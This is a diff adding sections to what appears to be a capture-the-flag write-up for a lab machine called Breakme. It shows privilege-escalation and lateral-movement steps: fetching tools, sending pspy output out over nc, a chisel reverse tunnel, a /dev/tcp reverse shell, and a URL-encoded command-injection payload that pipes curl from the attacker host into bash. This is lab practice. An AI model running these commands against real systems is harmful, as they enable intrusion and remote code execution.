@@ -877,8 +877,158 @@ Open 127.0.0.1:49472
 www-data@Breakme:/tmp$ chmod +x linpeas.sh && ls -al lin*
 -rwxrwxrwx 1 www-data www-data 956174 Aug 17 12:07 linpeas.sh
 www-data@Breakme:/tmp$ ./linpeas.sh 2>&1 | tee linpeas_output.txt
-
 ```
+
+### cron jobs
+```bash
+www-data@Breakme:/tmp$ ls
+linpeas.sh  linpeas_output.txt
+www-data@Breakme:/tmp$ wget http://10.23.93.75:8000/pspy64
+--2025-08-18 12:45:38--  http://10.23.93.75:8000/pspy64
+Connecting to 10.23.93.75:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64              100%[===================>]   2.96M   355KB/s    in 13s     
+
+2025-08-18 12:45:52 (235 KB/s) - ‘pspy64’ saved [3104768/3104768]
+
+www-data@Breakme:/tmp$ chmod 777 pspy64
+www-data@Breakme:/tmp$ ./pspy64 2>&1 | tee pspy_output.txt 
+```
+```bash
+www-data@Breakme:/tmp$ ls -al
+total 6052
+drwxrwxrwt  2 root     root        4096 Aug 18 12:53 .
+drwxr-xr-x 18 root     root        4096 Aug 17  2021 ..
+-rwxrwxrwx  1 www-data www-data  956174 Aug 18 12:25 linpeas.sh
+-rw-rw-rw-  1 www-data www-data  193204 Aug 18 12:56 linpeas_output.txt
+-rwxrwxrwx  1 www-data www-data 3104768 Aug 18 12:41 pspy64
+-rw-rw-rw-  1 www-data www-data 1926075 Aug 18 12:56 pspy64_output.txt
+www-data@Breakme:/tmp$ nc -nv 10.23.93.75 8000 < pspy64_output.txt
+Connection to 10.23.93.75 8000 port [tcp/*] succeeded!
+```
+```bash
+# attacker machine 
+> nc -nlvp 8000 > pspy64_output.txt
+listening on [any] 8000 ...
+connect to [10.23.93.75] from (UNKNOWN) [10.201.60.118] 38236
+```
+```bash
+> cat pspy64_output.txt | grep 1002
+2025/08/18 12:53:43 CMD: UID=1002  PID=517    | /usr/bin/php -S 127.0.0.1:9999 
+2025/08/18 12:55:09 CMD: UID=33    PID=310022 | 
+
+> cat pspy64_output.txt | grep john
+2025/08/18 12:54:00 CMD: UID=33    PID=301485 | grep -HnRIEi (blockchain[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['"]([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[0-9a-f]{12})['"] /home/john/.bash_logout 
+~/breakme > 
+```
+
+### Reverse tunneling (chisel or ligolo-ng)
+```bash
+# kali
+> chisel server -p 5000 --reverse
+2025/08/18 13:07:34 server: Reverse tunnelling enabled
+2025/08/18 13:07:34 server: Fingerprint aolRo3Xlyk3CBBfp/wKQdoW+XC2PqDnTsR8ynKABNc0=
+2025/08/18 13:07:34 server: Listening on http://0.0.0.0:5000
+# response
+2025/08/18 13:14:29 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
+2025/08/18 13:14:29 server: session#1: tun: proxy#R:4444=>localhost:9999: Listening
+
+# target 
+www-data@Breakme:/tmp$ chmod 777 chisel_1.10.1_linux_amd64
+www-data@Breakme:/tmp$ ./chisel_1.10.1_linux_amd64 client  10.23.93.75:5000 R:4444:localhost:9999
+2025/08/18 13:14:26 client: Connecting to ws://10.23.93.75:5000
+2025/08/18 13:14:29 client: Connected (Latency 338.952295ms)
+```
+```bash
+~/breakme > netstat -antop | grep 4444
+tcp6       0      0 :::4444                 :::*                    LISTEN      75309/chisel         off (0.00/0/0)
+```
+### Internal Service mapping
+```bash
+ 
+> nmap localhost -p 4444 -A -sC
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 13:17 EDT
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000042s latency).
+Other addresses for localhost (not scanned): ::1
+
+PORT     STATE SERVICE VERSION
+4444/tcp open  http    PHP cli server 5.5 or later (PHP 7.4.33)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Test
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6
+OS details: Linux 2.6.32, Linux 5.0 - 6.2
+Network Distance: 0 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 38.28 seconds
+```
+![command](command.png)
+
+
+### Testing commmand injection, ssrf, lfi, rce 
+```bash
+> sudo tcpdump -i tun0 icmp
+[sudo] password for kali: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+13:39:02.033305 IP breakme.thm > 10.23.93.75: ICMP echo request, id 2436, seq 1, length 64
+13:39:02.033315 IP 10.23.93.75 > breakme.thm: ICMP echo reply, id 2436, seq 1, length 64
+13:39:03.070680 IP breakme.thm > 10.23.93.75: ICMP echo request, id 2436, seq 2, length 64
+13:39:03.070697 IP 10.23.93.75 > breakme.thm: ICMP echo reply, id 2436, seq 2, length 64
+```
+![tcpdmp](intercept.png)
+
+### Lateral movement to john
+
+```bash
+# terminal 1 
+/bin/bash -i >& /dev/tcp/10.23.93.75/9001 0>&1
+```
+```bash
+# terminal 2 
+python3 -m http.server 8000 
+```
+```bash
+# terminal 3
+> nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.23.93.75] from (UNKNOWN) [10.201.60.118] 49502
+bash: cannot set terminal process group (517): Inappropriate ioctl for device
+bash: no job control in this shell
+john@Breakme:~/internal$ 
+```
+```bash
+# terminal 4
+curl -X POST http://localhost:4444 \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Cookie: PHPSESSID=oksd2bsnsg8prgtn4gshjvp0q5" \
+  -d "cmd2=%7Ccurl%24%7BIFS%7Dhttp%3A%2F%2F10.23.93.75%3A8000%2Fpayload.sh%7Cbash"
+```
+
+### Lateral movement to youcef
+```bash
+john@Breakme:/home/youcef$ ls
+ls
+readfile
+readfile.c
+john@Breakme:/home/youcef$ 
+```
+### Flags 
+- flag 1
+    - 5c3ea0d31[redacted]13785b26677
+
+
+
 ### Gaining Root 
 
 ## Post-Exploitation
